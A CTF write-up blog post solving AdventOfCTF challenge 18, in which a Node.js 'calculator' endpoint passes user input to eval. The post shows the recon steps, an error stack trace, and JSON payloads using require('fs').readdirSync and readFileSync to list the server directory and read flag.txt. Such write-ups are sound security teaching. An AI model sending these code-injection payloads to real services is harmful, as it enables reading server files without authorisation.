+++
author = "Maik de Kruif"
title = "Challenge 18 - AdventOfCTF"
date = 2021-01-06T23:04:52+01:00
description = "A writeup for challenge 18 of AdventOfCTF."
cover = "img/adventofctf/2020/be40bcd25e7487440a64b13cd32049b2.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "javascipt",
    "nodejs",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 1800

## Description

We created a calculator for Santa to figure out how many days until Christmas remain. It is not finished yet, it will only return what you give it. Sort of. The flag is in flag.txt.

Visit <https://18.adventofctf.com> to start the challenge.

## Recon

Upon opening the challenge website we're greeted with an input field which asks us to "enter the nr of days until christmas".

When opening the source of the page we also find some javascript code:

```js
function send() {
  let calc = $("#calc")[0].value;
  if (calc.length > 0) {
    $.ajax({
      url: "/calc",
      type: "POST",
      data: '{"calc": "' + calc + '" }',
      contentType: "application/json; charset=utf-8",
      dataType: "json",
    }).always(function (data) {
      text = data;
      if (data.responseText) {
        text = data.responseText;
      }
      $("#msg")[0].innerHTML = "<b>" + text + "</b>";
    });
  }
}
```

As the description tells us it's a calculator, let's try entering `3+4` in the input field. It will make a `POST` request to `/calc`, which will return `7`.

## Finding the vulnerability

If we capture the request with a proxy like Burp, we can see it sends a `POST` request with some JSON data. It looks like this:

```json
{
  "calc": "3+4"
}
```

To find out how the calculator works internally we can try to send some data it doesn't expect to try to break it. An example would be sending an empty post request.

If we try that we get the following error back:

```text
TypeError: Cannot read property 'toString' of undefined
    at /opt/app/server.js:14:13
    at Layer.handle [as handle_request] (/opt/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/opt/app/node_modules/express/lib/router/route.js:137:13)
    at /opt/app/node_modules/body-parser/lib/read.js:130:5
    at invokeCallback (/opt/app/node_modules/raw-body/index.js:224:16)
    at done (/opt/app/node_modules/raw-body/index.js:213:7)
    at IncomingMessage.onEnd (/opt/app/node_modules/raw-body/index.js:273:7)
    at IncomingMessage.emit (events.js:203:15)
    at endReadableNT (_stream_readable.js:1145:12)
    at process._tickCallback (internal/process/next_tick.js:63:19)
```

This hints at a NodeJS Express server, but it does not give us much information about the calculation besides a `toString` which would be unnecessary if the output would always be a number. This could hint at an `eval` vulnerability.

A NodeJS Express server often has a `res` variable to which the request result is written. Let's try to get it by entering it in de input field.

```json
{
  "calc": "res"
}
```

The result is `[object Object]` which means the input is evaluated.

## Exploit

Now we know the input is evaluated, we can try to read the flag. To find the file, let's try to list the directory contents.

In NodeJS we can do this by using the `fs` module and using the `readdirSync()` function. The resulting code would be `require('fs').readdirSync('.')`.

The resulting request:

```json
{
  "calc": "require('fs').readdirSync('.')"
}
```

This gives us the following result:

```text
flag.txt,node_modules,package-lock.json,package.json,public,server.js
```

Now that we know the location of the flag (`flag.txt`), we can use the `readFileSync()` function to read the file:

```json
{
  "calc": "require('fs').readFileSync('flag.txt')"
}
```

## Solution

We got the flag! It is `NOVI{N3v3r_us3_eval}`.
